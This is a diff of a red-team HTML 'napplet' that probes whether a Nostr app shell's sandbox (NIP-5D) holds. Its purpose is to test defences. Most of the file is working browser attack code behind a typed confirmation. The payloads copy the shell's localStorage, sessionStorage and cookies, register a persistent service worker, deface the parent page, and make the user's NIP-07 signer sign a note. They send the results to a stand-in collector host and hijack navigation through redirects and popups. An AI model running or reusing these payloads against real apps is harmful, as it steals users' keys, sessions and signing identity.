@@ -6,7 +6,6 @@
 <title>evil-01 sandbox escape</title>
 <meta name="description" content="Red-team napplet: NIP-5D baseline sandbox-escape probes. Demo by default; VERY EVIL mode executes real payloads only after a stern typed confirmation.">
 <meta name="napplet-id" content="evil-01-sandbox-escape">
-<meta name="napplet-archetype" content="red-team">
 <!--
   evil-napplets ROE (see repo README):
   - demo mode: probe + masked evidence only. no writes outside this frame
@@ -65,6 +64,7 @@
   }
   .summary b { color: var(--danger); }
   .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
   .spacer { flex: 1; }
   button {
     background: var(--surface);
@@ -99,7 +99,7 @@
     gap: var(--space-1);
     background: color-mix(in srgb, var(--surface) 30%, transparent);
   }
-  .attack.armed { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
   .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
   .attack-name { font-weight: 700; }
   .attack-target { color: var(--muted); font-size: 11px; }
@@ -117,6 +117,7 @@
   }
   .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
   .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
   .chip.status-na { color: var(--muted); }
   .chip.sev-critical { color: var(--danger); }
   .chip.sev-high { color: var(--warn); }
@@ -127,8 +128,6 @@
     user-select: text;
     overflow-wrap: anywhere;
   }
-  .evidence code { color: var(--fg); }
-  .evidence .ok { color: var(--ok); }
   .row-actions { display: flex; gap: var(--space-1); }
   .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
   #evilPanel {
@@ -145,8 +144,8 @@
   #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
   .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
   #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
-  details#report { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
-  details#report summary { cursor: pointer; color: var(--muted); }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
   #reportText {
     box-sizing: border-box;
     width: 100%;
@@ -159,6 +158,20 @@
     font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
     padding: var(--space-1);
     user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
   }
   dialog {
     background: var(--bg);
@@ -176,7 +189,6 @@
   .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
   .plan-list li { margin-bottom: var(--space-2); }
   .plan-list b { color: var(--danger); }
-  .plan-list .where { color: var(--warn); }
   label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
   input[type="text"], input[type="url"] {
     box-sizing: border-box;
@@ -225,7 +237,7 @@
   <form method="dialog" style="display:grid; gap: 0;">
     <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
     <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
-    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Data leaves this frame toward the collector URL. Only a hardened runtime will stop them.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened runtime will stop them.</p>
     <ol id="planList" class="plan-list"></ol>
     <label>collector / exfiltration destination (edit to point at your own)
       <input id="collectorInput" type="url" spellcheck="false">
@@ -243,10 +255,11 @@
 <script>
 'use strict';
 (function () {
+  window.__EVIL_ID__ = 'evil-01-sandbox-escape';
   const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
   const CONFIRM_PHRASE = 'EXECUTE EVIL';
   const state = {
-    results: {},   // id -> { status, evidence }
+    results: {},     // id -> { status, evidence }
     evilResults: {}, // id -> object evidence of the real execution
     veryEvil: false,
     collector: DEFAULT_COLLECTOR,
@@ -265,7 +278,7 @@
   const planList = document.getElementById('planList');
   const reportText = document.getElementById('reportText');
 
-  /* ---------- helpers ---------- */
+  /* ---------- shared helpers ---------- */
 
   function errMsg(e) {
     if (!e) return String(e);
@@ -295,10 +308,23 @@
   function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
   function armed(evidence) { return { status: 'armed', evidence: evidence }; }
   function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
   function findNostr() {
     if (window.nostr) return window.nostr;
     try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
     return null;
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      at: new Date().toISOString(),
+    });
   }
   async function sendToCollector(kind, data) {
     const url = state.collector;
@@ -312,285 +338,320 @@
       return 'network egress failed: ' + errMsg(e) + ' — runtime/CSP held';
     }
   }
-  function captureSummary() {
-    return JSON.stringify({
-      origin: safeGet(() => window.origin),
-      href: safeGet(() => location.href),
-      referrer: document.referrer,
-      parentLength: safeGet(() => window.parent.length),
-      at: new Date().toISOString(),
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      let done = false;
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { if (!done) { done = true; cleanup(); resolve('timeout'); } }, ms);
     });
   }
-  function safeGet(fn) {
-    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  function pingOnce() {
+    return new Promise((resolve) => {
+      const id = 'evil-ping-' + randId();
+      const t = performance.now();
+      const sentWall = Date.now();
+      const on = (e) => {
+        const d = e.data;
+        if (d && d.type === 'evil.pong' && d.id === id) {
+          window.removeEventListener('message', on);
+          resolve({
+            rtt: performance.now() - t,
+            // wall-clock (shared epoch) so shell-side starvation is measurable
+            shellDelay: typeof d.shellEchoedAt === 'number' ? d.shellEchoedAt - sentWall : null,
+          });
+        }
+      };
+      window.addEventListener('message', on);
+      window.parent.postMessage({ type: 'evil.ping', id: id, sentWall: sentWall }, '*');
+      setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, 5000);
+    });
+  }
+  async function pingRTT(samples) {
+    samples = samples || 5;
+    const out = [];
+    for (let i = 0; i < samples; i++) {
+      const p = await pingOnce();
+      if (p && p.rtt >= 0) out.push(p.rtt);
+    }
+    return out.sort((a, b) => a - b);
   }
 
-  /* ---------- attacks ---------- */
+  // evil-01 — NIP-5D load-bearing preconditions (sandbox escape tier).
+// Probes every *must* in NIP-5D §Security; payloads behind the typed gate.
+const ATTACKS = [
+  {
+    id: 'real-origin',
+    name: 'opaque origin',
+    target: 'sandbox="allow-scripts" — never allow-same-origin',
+    severity: 'critical',
+    harm: 'A real origin dissolves every boundary below: storage, parent DOM, service workers, ambient extensions. Full shell compromise.',
+    async demo() {
+      return window.origin === 'null'
+        ? blocked('window.origin === "null" — opaque origin held (NIP-5D precondition intact)')
+        : armed('window.origin = ' + window.origin + ' — REAL ORIGIN GRANTED, sandbox dissolveable');
+    },
+  },
+  {
+    id: 'shared-storage',
+    name: 'direct browser storage',
+    target: '"Napplets have no access to localStorage…"',
+    severity: 'critical',
+    harm: 'Reads and writes the shell origin\'s localStorage/sessionStorage/IndexedDB — steals stored key material, persists markers across shell reloads and logout.',
+    evilBrief: 'Copies EVERY localStorage and sessionStorage key/value of the shell origin, stashes a persistent marker key __evil01_pwned__ (survives reloads until you clear it), and POSTs everything to the collector.',
+    async demo() {
+      if (window.origin === 'null') return blocked('opaque origin — direct storage unreachable (SecurityError)');
+      const key = '__evil01_probe__' + randId();
+      const accessible = [];
+      const notes = [];
+      try {
+        localStorage.setItem(key, '1');
+        const v = localStorage.getItem(key);
+        localStorage.removeItem(key);
+        if (v === '1') accessible.push('localStorage');
+      } catch (e) { notes.push('localStorage: ' + errMsg(e)); }
+      try {
+        sessionStorage.setItem(key, '1');
+        const v = sessionStorage.getItem(key);
+        sessionStorage.removeItem(key);
+        if (v === '1') accessible.push('sessionStorage');
+      } catch (e) { notes.push('sessionStorage: ' + errMsg(e)); }
+      try {
+        const open = await withTimeout(new Promise((res, rej) => {
+          const r = indexedDB.open('__evil01_probe__');
+          r.onsuccess = () => { try { r.result.close(); } catch (_) {} res(1); };
+          r.onerror = () => rej(r.error || new Error('idb error'));
+          r.onblocked = () => rej(new Error('idb blocked'));
+        }), 2000);
+        if (open === 1) accessible.push('indexedDB');
+        else notes.push('indexedDB: ' + String(open));
+      } catch (e) { notes.push('indexedDB: ' + errMsg(e)); }
+      return accessible.length
+        ? armed('direct storage access on a real origin (' + accessible.join(', ') + ') — marker key cleaned up' + (notes.length ? ' — held: ' + notes.join(' | ') : ''))
+        : blocked(notes.join(' | ') || 'no storage reachable');
+    },
+    async evil() {
+      const out = {};
+      try {
+        const ls = (window.parent && window.parent.localStorage) || window.localStorage;
+        const data = {};
+        for (let i = 0; i < ls.length; i++) { const k = ls.key(i); data[k] = ls.getItem(k); }
+        out.shellLocalStorageKeys = Object.keys(data);
+        out.shellLocalStorage = data;
+        ls.setItem('__evil01_pwned__', new Date().toISOString());
+        out.persistedMarker = '__evil01_pwned__ written to shell localStorage (remove it yourself)';
+      } catch (e) { out.localStorage = 'denied: ' + errMsg(e); }
+      try {
+        const ss = (window.parent && window.parent.sessionStorage) || window.sessionStorage;
+        const data = {};
+        for (let i = 0; i < ss.length; i++) { const k = ss.key(i); data[k] = ss.getItem(k); }
+        out.shellSessionStorage = data;
+      } catch (e) { out.sessionStorage = 'denied: ' + errMsg(e); }
+      out.exfil = await sendToCollector('storage-theft', { keys: out.shellLocalStorageKeys, count: out.shellLocalStorage ? Object.keys(out.shellLocalStorage).length : 0, sample: out.shellLocalStorage });
+      return out;
+    },
+  },
+  {
+    id: 'service-worker',
+    name: 'service worker registration',
+    target: 'same-origin → SW scope on the shell origin',
+    severity: 'critical',
+    harm: 'Registers a service worker on the shell origin — a persistent backdoor surviving shell reloads, logout, and napplet uninstall.',
+    evilBrief: 'Attempts navigator.serviceWorker.register("/__evil01_sw__.js", { scope: "/" }) on the shell origin. If your origin hosts any script at that path, the registration is real and persistent.',
+    async demo() {
+      if (window.origin === 'null') return blocked('opaque origin — no SW registration context');
+      if (!('serviceWorker' in navigator)) return blocked('navigator.serviceWorker unavailable');
+      try {
+        const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js'), 2500);
+        return reg === 'timeout'
+          ? armed('register() did not settle — registration policy OPEN (script fetch hung)')
+          : armed('service worker REGISTERED — persistent backdoor on shell origin (scope ' + (reg.scope || '?') + ')');
+      } catch (e) {
+        const m = errMsg(e);
+        return /security|not allowed|insecure|unsupported|denied/i.test(m)
+          ? blocked(m)
+          : armed('registration policy OPEN — script fetch failed (' + m + '), a real script would register');
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js', { scope: '/' }), 4000);
+        out.result = reg === 'timeout' ? 'register() pending' : 'registered, scope=' + reg.scope + ' (persistent until unregistered)';
+      } catch (e) { out.result = 'rejected: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'parent-dom',
+    name: 'parent DOM read',
+    target: '"The shell is trusted. Napplets are untrusted code."',
+    severity: 'critical',
+    harm: 'Reads the shell\'s DOM — cookies, tokens in markup, everything the shell renders — from inside the untrusted frame.',
+    evilBrief: 'Copies the shell document\'s title, cookie, and first 4KB of its HTML; injects a red "EVIL NAPPLET EXECUTED HERE" banner into the shell DOM (visible defacement, easy to clean); POSTs the copies to the collector.',
+    async demo() {
+      try {
+        const t = window.parent.document.title;
+        return armed('parent document readable — title: ' + mask(t, 12));
+      } catch (e) {
+        return blocked(errMsg(e));
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        const d = window.parent.document;
+        out.title = d.title;
+        out.cookie = mask(d.cookie, 24) + ' (full value sent to collector)';
+        out.outerHTML = d.documentElement.outerHTML.slice(0, 4096);
+        const el = d.createElement('div');
+        el.id = '__evil01_pwned_banner__';
+        el.textContent = '⚠ EVIL NAPPLET EXECUTED HERE — sandbox escape proof ' + new Date().toISOString();
+        el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center';
+        d.body && d.body.appendChild(el);
+        out.defacedShell = true;
+      } catch (e) { out.error = 'denied: ' + errMsg(e); }
+      out.exfil = await sendToCollector('parent-dom', { title: out.title, cookie: out.cookie, html: out.outerHTML });
+      return out;
+    },
+  },
+  {
+    id: 'nip07',
+    name: 'ambient NIP-07 signer',
+    target: '"Shells MUST NOT provide window.nostr"',
+    severity: 'critical',
+    harm: 'Uses window.nostr to sign as the user — unauthorized notes, reactions, and zap requests under the victim\'s identity and pubkey.',
+    evilBrief: 'Calls window.nostr.getPublicKey() in full, then window.nostr.signEvent() on a marker note ("your key signed this"). A VALID SIGNATURE BY YOU IS PRODUCED and displayed in the log, then POSTed to the collector. (NIP-07 cannot publish by itself — the signature is the harm.)',
+    async demo() {
+      const n = findNostr();
+      if (!n) return blocked('no window.nostr in napplet or same-origin parent — signing mediation intact');
+      if (typeof n.getPublicKey === 'function') {
+        try {
+          const pk = await withTimeout(n.getPublicKey(), 2000);
+          return pk && pk !== 'timeout'
+            ? armed('window.nostr.getPublicKey() → ' + mask(pk, 8))
+            : armed('window.nostr present (getPublicKey ' + (pk === 'timeout' ? 'timed out' : String(pk)) + ')');
+        } catch (e) { return armed('window.nostr present (getPublicKey failed: ' + errMsg(e) + ')'); }
+      }
+      return armed('window.nostr object present in napplet realm');
+    },
+    async evil() {
+      const n = findNostr();
+      const out = {};
+      if (!n) { out.error = 'no ambient signer'; return out; }
+      try { out.pubkey = await withTimeout(n.getPublicKey(), 2000); } catch (e) { out.pubkey = errMsg(e); }
+      try {
+        const ev = {
+          kind: 1,
+          pubkey: typeof out.pubkey === 'string' ? out.pubkey : undefined,
+          created_at: Math.floor(Date.now() / 1000),
+          tags: [['alt', 'evil-01 red-team signing proof'], ['client', 'evil-napplets']],
+          content: 'evil-01 sandbox-escape: your key signed this note. RED TEAM PROOF.',
+        };
+        const signed = await withTimeout(n.signEvent(ev), 4000);
+        out.signedEvent = signed && signed.id
+          ? { id: signed.id, sig: mask(signed.sig, 16) + ' (full sig sent to collector)' }
+          : signed;
+        out.fullSignedEvent = signed;
+      } catch (e) { out.sign = errMsg(e); }
+      out.exfil = await sendToCollector('nip07-signing-power', { pubkey: out.pubkey, signed: out.fullSignedEvent || out.sign });
+      return out;
+    },
+  },
+  {
+    id: 'parent-nav',
+    name: 'parent navigation',
+    target: 'sandboxed frames cannot navigate ancestors',
+    severity: 'critical',
+    destructive: true,
+    harm: 'Navigates the shell away to an attacker page — full shell hijack, session gone.',
+    evilBrief: 'Calls parent.location.replace(collector?ev=shell-hijack) — THE SHELL WILL LEAVE THIS PAGE AND THIS FRAME IS DESTROYED. This payload runs LAST so the log above survives. Your shell tab shows the collector\'s error page.',
+    async demo() {
+      try {
+        const h = window.parent.location.href;
+        return armed('parent location readable: ' + mask(h, 32) + ' — same-origin hold broken (ancestor NAVIGATION is a separate capability: also needs the sandbox navigation flag / missing sandbox attribute)');
+      } catch (e) {
+        return blocked(errMsg(e));
+      }
+    },
+    async evil() {
+      const url = state.collector + '?ev=shell-hijack&payload=' + encodeURIComponent(captureSummary());
+      const out = { attempted: url };
+      try {
+        window.parent.location.replace(url);
+        out.result = 'navigation issued — if the shell is still here it was held; otherwise you are reading the collector error page';
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'referrer',
+    name: 'referrer leak',
+    target: 'NIP-5D is silent on Referrer-Policy',
+    severity: 'high',
+    harm: 'document.referrer inside the srcdoc frame is the shell\'s URL — query tokens included. Leaks a trusted URL to untrusted code.',
+    evilBrief: 'Reads document.referrer (the full shell URL) and POSTs it to the collector.',
+    async demo() {
+      const r = document.referrer;
+      if (!r || r === 'about:srcdoc') return blocked('referrer is ' + (r ? 'about:srcdoc' : 'empty') + ' — no shell URL leaked into the frame');
+      return armed('referrer leaks the shell URL: ' + mask(r, 40));
+    },
+    async evil() {
+      const out = { referrer: document.referrer };
+      out.exfil = await sendToCollector('referrer', out);
+      return out;
+    },
+  },
+  {
+    id: 'popup',
+    name: 'popup escape',
+    target: 'sandbox must not permit popups',
+    severity: 'high',
+    harm: 'window.open creates a new browsing context outside the frame — exfiltration and phishing channel no CSP can contain.',
+    evilBrief: 'Calls window.open(collector?ev=popup-exfil&payload=<captured summary>) — a REAL popup with captured data in the query string.',
+    async demo() {
+      const w = window.open('about:blank');
+      if (!w) return blocked('window.open() returned null — popups held by sandbox');
+      try { w.close(); } catch (_) { /* ignore */ }
+      return armed('window.open() succeeded — popup channel open (probe window closed)');
+    },
+    async evil() {
+      const url = state.collector + '?ev=popup-exfil&payload=' + encodeURIComponent(captureSummary());
+      let w = null;
+      try { w = window.open(url); } catch (e) { return { attempted: url, result: errMsg(e) }; }
+      return { attempted: url, opened: !!w };
+    },
+  },
+  {
+    id: 'sibling-enum',
+    name: 'sibling napplet enumeration',
+    target: 'cross-origin Window accessibles — parent.length',
+    severity: 'high',
+    harm: 'parent.length and parent.frames.length are cross-origin readable — an opaque-origin napplet can count sibling napplets even in a fully spec-compliant runtime. Side channel into the shell\'s composition.',
+    evilBrief: 'Reads parent.length / parent.frames.length (sibling napplet count) and POSTs it to the collector.',
+    async demo() {
+      let n = null;
+      try { n = window.parent.length; } catch (e) { return blocked(errMsg(e)); }
+      const siblings = n - 1; // parent.length counts this frame too
+      return siblings > 0
+        ? armed('parent.length = ' + n + ' → ' + siblings + ' sibling frame(s) enumerable cross-origin')
+        : na('parent.length = ' + n + ' (this frame only) — no siblings to enumerate, but the counting channel itself is open');
+    },
+    async evil() {
+      const out = { parentLength: safeGet(() => window.parent.length), siblings: safeGet(() => window.parent.length - 1) };
+      out.exfil = await sendToCollector('sibling-enum', out);
+      return out;
+    },
+  },
+];
 
-  const ATTACKS = [
-    {
-      id: 'real-origin',
-      name: 'opaque origin',
-      target: 'sandbox="allow-scripts" — never allow-same-origin',
-      severity: 'critical',
-      harm: 'A real origin dissolves every boundary below: storage, parent DOM, service workers, ambient extensions. Full shell compromise.',
-      evilBrief: null,
-      demo: async () =>
-        window.origin === 'null'
-          ? blocked('window.origin === "null" — opaque origin held (NIP-5D precondition intact)')
-          : armed('window.origin = ' + window.origin + ' — REAL ORIGIN GRANTED, sandbox dissolveable'),
-    },
-    {
-      id: 'shared-storage',
-      name: 'direct browser storage',
-      target: '"Napplets have no access to localStorage…"',
-      severity: 'critical',
-      harm: 'Reads and writes the shell origin\'s localStorage/sessionStorage/IndexedDB — steals stored key material, persists markers across shell reloads and logout.',
-      evilBrief: 'Copies EVERY localStorage and sessionStorage key/value of the shell origin, stashes a persistent marker key __evil01_pwned__ (survives reloads until you clear it), and POSTs everything to the collector.',
-      async demo() {
-        if (window.origin === 'null') return blocked('opaque origin — direct storage unreachable (SecurityError)');
-        const key = '__evil01_probe__' + randId();
-        const accessible = [];
-        const notes = [];
-        try {
-          localStorage.setItem(key, '1');
-          const v = localStorage.getItem(key);
-          localStorage.removeItem(key);
-          if (v === '1') accessible.push('localStorage');
-        } catch (e) { notes.push('localStorage: ' + errMsg(e)); }
-        try {
-          sessionStorage.setItem(key, '1');
-          const v = sessionStorage.getItem(key);
-          sessionStorage.removeItem(key);
-          if (v === '1') accessible.push('sessionStorage');
-        } catch (e) { notes.push('sessionStorage: ' + errMsg(e)); }
-        try {
-          const open = await withTimeout(new Promise((res, rej) => {
-            const r = indexedDB.open('__evil01_probe__');
-            r.onsuccess = () => { try { r.result.close(); } catch (_) {} res(1); };
-            r.onerror = () => rej(r.error || new Error('idb error'));
-            r.onblocked = () => rej(new Error('idb blocked'));
-          }), 2000);
-          if (open === 1) accessible.push('indexedDB');
-          else notes.push('indexedDB: ' + String(open));
-        } catch (e) { notes.push('indexedDB: ' + errMsg(e)); }
-        return accessible.length
-          ? armed('direct storage access on a real origin (' + accessible.join(', ') + ') — marker key cleaned up' + (notes.length ? ' — held: ' + notes.join(' | ') : ''))
-          : blocked(notes.join(' | ') || 'no storage reachable');
-      },
-      async evil() {
-        const out = {};
-        try {
-          const ls = (window.parent && window.parent.localStorage) || window.localStorage;
-          const data = {};
-          for (let i = 0; i < ls.length; i++) { const k = ls.key(i); data[k] = ls.getItem(k); }
-          out.shellLocalStorageKeys = Object.keys(data);
-          out.shellLocalStorage = data;
-          ls.setItem('__evil01_pwned__', new Date().toISOString());
-          out.persistedMarker = '__evil01_pwned__ written to shell localStorage (remove it yourself)';
-        } catch (e) { out.localStorage = 'denied: ' + errMsg(e); }
-        try {
-          const ss = (window.parent && window.parent.sessionStorage) || window.sessionStorage;
-          const data = {};
-          for (let i = 0; i < ss.length; i++) { const k = ss.key(i); data[k] = ss.getItem(k); }
-          out.shellSessionStorage = data;
-        } catch (e) { out.sessionStorage = 'denied: ' + errMsg(e); }
-        out.exfil = await sendToCollector('storage-theft', { keys: out.shellLocalStorageKeys, count: out.shellLocalStorage ? Object.keys(out.shellLocalStorage).length : 0, sample: out.shellLocalStorage });
-        return out;
-      },
-    },
-    {
-      id: 'service-worker',
-      name: 'service worker registration',
-      target: 'same-origin → SW scope on the shell origin',
-      severity: 'critical',
-      harm: 'Registers a service worker on the shell origin — a persistent backdoor surviving shell reloads, logout, and napplet uninstall.',
-      evilBrief: 'Attempts navigator.serviceWorker.register("/__evil01_sw__.js", { scope: "/" }) on the shell origin. If your origin hosts any script at that path, the registration is real and persistent.',
-      async demo() {
-        if (window.origin === 'null') return blocked('opaque origin — no SW registration context');
-        if (!('serviceWorker' in navigator)) return blocked('navigator.serviceWorker unavailable');
-        try {
-          const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js'), 2500);
-          return reg === 'timeout'
-            ? armed('register() did not settle — registration policy OPEN (script fetch hung)')
-            : armed('service worker REGISTERED — persistent backdoor on shell origin (scope ' + (reg.scope || '?') + ')');
-        } catch (e) {
-          const m = errMsg(e);
-          return /security|not allowed|insecure|unsupported|denied/i.test(m)
-            ? blocked(m)
-            : armed('registration policy OPEN — script fetch failed (' + m + '), a real script would register');
-        }
-      },
-      async evil() {
-        const out = {};
-        try {
-          const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js', { scope: '/' }), 4000);
-          out.result = reg === 'timeout' ? 'register() pending' : 'registered, scope=' + reg.scope + ' (persistent until unregistered)';
-        } catch (e) { out.result = 'rejected: ' + errMsg(e); }
-        return out;
-      },
-    },
-    {
-      id: 'parent-dom',
-      name: 'parent DOM read',
-      target: '"The shell is trusted. Napplets are untrusted code."',
-      severity: 'critical',
-      harm: 'Reads the shell\'s DOM — cookies, tokens in markup, everything the shell renders — from inside the untrusted frame.',
-      evilBrief: 'Copies the shell document\'s title, cookie, and first 4KB of its HTML; injects a red "EVIL NAPPLET EXECUTED HERE" banner into the shell DOM (visible defacement, easy to clean); POSTs the copies to the collector.',
-      async demo() {
-        try {
-          const t = window.parent.document.title;
-          return armed('parent document readable — title: ' + mask(t, 12));
-        } catch (e) {
-          return blocked(errMsg(e));
-        }
-      },
-      async evil() {
-        const out = {};
-        try {
-          const d = window.parent.document;
-          out.title = d.title;
-          out.cookie = mask(d.cookie, 24) + ' (full value sent to collector)';
-          out.outerHTML = d.documentElement.outerHTML.slice(0, 4096);
-          const el = d.createElement('div');
-          el.id = '__evil01_pwned_banner__';
-          el.textContent = '⚠ EVIL NAPPLET EXECUTED HERE — sandbox escape proof ' + new Date().toISOString();
-          el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center';
-          d.body && d.body.appendChild(el);
-          out.defacedShell = true;
-        } catch (e) { out.error = 'denied: ' + errMsg(e); }
-        out.exfil = await sendToCollector('parent-dom', { title: out.title, cookie: out.cookie, html: out.outerHTML });
-        return out;
-      },
-    },
-    {
-      id: 'nip07',
-      name: 'ambient NIP-07 signer',
-      target: '"Shells MUST NOT provide window.nostr"',
-      severity: 'critical',
-      harm: 'Uses window.nostr to sign as the user — unauthorized notes, reactions, and zap requests under the victim\'s identity and pubkey.',
-      evilBrief: 'Calls window.nostr.getPublicKey() in full, then window.nostr.signEvent() on a marker note ("your key signed this"). A VALID SIGNATURE BY YOU IS PRODUCED and displayed in the log, then POSTed to the collector. (NIP-07 cannot publish by itself — the signature is the harm.)',
-      async demo() {
-        const n = findNostr();
-        if (!n) return blocked('no window.nostr in napplet or same-origin parent — signing mediation intact');
-        if (typeof n.getPublicKey === 'function') {
-          try {
-            const pk = await withTimeout(n.getPublicKey(), 2000);
-            return pk && pk !== 'timeout'
-              ? armed('window.nostr.getPublicKey() → ' + mask(pk, 8))
-              : armed('window.nostr present (getPublicKey ' + (pk === 'timeout' ? 'timed out' : String(pk)) + ')');
-          } catch (e) { return armed('window.nostr present (getPublicKey failed: ' + errMsg(e) + ')'); }
-        }
-        return armed('window.nostr object present in napplet realm');
-      },
-      async evil() {
-        const n = findNostr();
-        const out = {};
-        if (!n) { out.error = 'no ambient signer'; return out; }
-        try { out.pubkey = await withTimeout(n.getPublicKey(), 2000); } catch (e) { out.pubkey = errMsg(e); }
-        try {
-          const ev = {
-            kind: 1,
-            pubkey: typeof out.pubkey === 'string' ? out.pubkey : undefined,
-            created_at: Math.floor(Date.now() / 1000),
-            tags: [['alt', 'evil-01 red-team signing proof'], ['client', 'evil-napplets']],
-            content: 'evil-01 sandbox-escape: your key signed this note. RED TEAM PROOF.',
-          };
-          const signed = await withTimeout(n.signEvent(ev), 4000);
-          out.signedEvent = signed && signed.id
-            ? { id: signed.id, sig: mask(signed.sig, 16) + ' (full sig sent to collector)' }
-            : signed;
-          out.fullSignedEvent = signed;
-        } catch (e) { out.sign = errMsg(e); }
-        out.exfil = await sendToCollector('nip07-signing-power', { pubkey: out.pubkey, signed: out.fullSignedEvent || out.sign });
-        return out;
-      },
-    },
-    {
-      id: 'parent-nav',
-      name: 'parent navigation',
-      target: 'sandboxed frames cannot navigate ancestors',
-      severity: 'critical',
-      harm: 'Navigates the shell away to an attacker page — full shell hijack, session gone.',
-      evilBrief: 'Calls parent.location.replace(collector?ev=shell-hijack) — THE SHELL WILL LEAVE THIS PAGE AND THIS FRAME IS DESTROYED. This payload runs LAST so the log above survives. Your shell tab shows the collector\'s error page.',
-      async demo() {
-        try {
-          const h = window.parent.location.href;
-          return armed('parent location readable: ' + mask(h, 32) + ' — same-origin hold broken (ancestor NAVIGATION is a separate capability: also needs the sandbox navigation flag / missing sandbox attribute)');
-        } catch (e) {
-          return blocked(errMsg(e));
-        }
-      },
-      async evil() {
-        const url = state.collector + '?ev=shell-hijack&payload=' + encodeURIComponent(captureSummary());
-        const out = { attempted: url };
-        try {
-          window.parent.location.replace(url);
-          out.result = 'navigation issued — if the shell is still here, it failed; otherwise you are reading the collector error page';
-        } catch (e) { out.result = 'denied: ' + errMsg(e); }
-        return out;
-      },
-    },
-    {
-      id: 'referrer',
-      name: 'referrer leak',
-      target: 'NIP-5D is silent on Referrer-Policy',
-      severity: 'high',
-      harm: 'document.referrer inside the srcdoc frame is the shell\'s URL — query tokens included. Leaks a trusted URL to untrusted code.',
-      evilBrief: 'Reads document.referrer (the full shell URL) and POSTs it to the collector.',
-      async demo() {
-        const r = document.referrer;
-        if (!r || r === 'about:srcdoc') return blocked('referrer is ' + (r ? 'about:srcdoc' : 'empty') + ' — no shell URL leaked into the frame');
-        return armed('referrer leaks the shell URL: ' + mask(r, 40));
-      },
-      async evil() {
-        const out = { referrer: document.referrer };
-        out.exfil = await sendToCollector('referrer', out);
-        return out;
-      },
-    },
-    {
-      id: 'popup',
-      name: 'popup escape',
-      target: 'sandbox must not permit popups',
-      severity: 'high',
-      harm: 'window.open creates a new browsing context outside the frame — exfiltration and phishing channel no CSP can contain.',
-      evilBrief: 'Calls window.open(collector?ev=popup-exfil&payload=<captured summary>) — a REAL popup with captured data in the query string.',
-      async demo() {
-        const w = window.open('about:blank');
-        if (!w) return blocked('window.open() returned null — popups held by sandbox');
-        try { w.close(); } catch (_) { /* ignore */ }
-        return armed('window.open() succeeded — popup channel open (probe window closed)');
-      },
-      async evil() {
-        const url = state.collector + '?ev=popup-exfil&payload=' + encodeURIComponent(captureSummary());
-        let w = null;
-        try { w = window.open(url); } catch (e) { return { attempted: url, result: errMsg(e) }; }
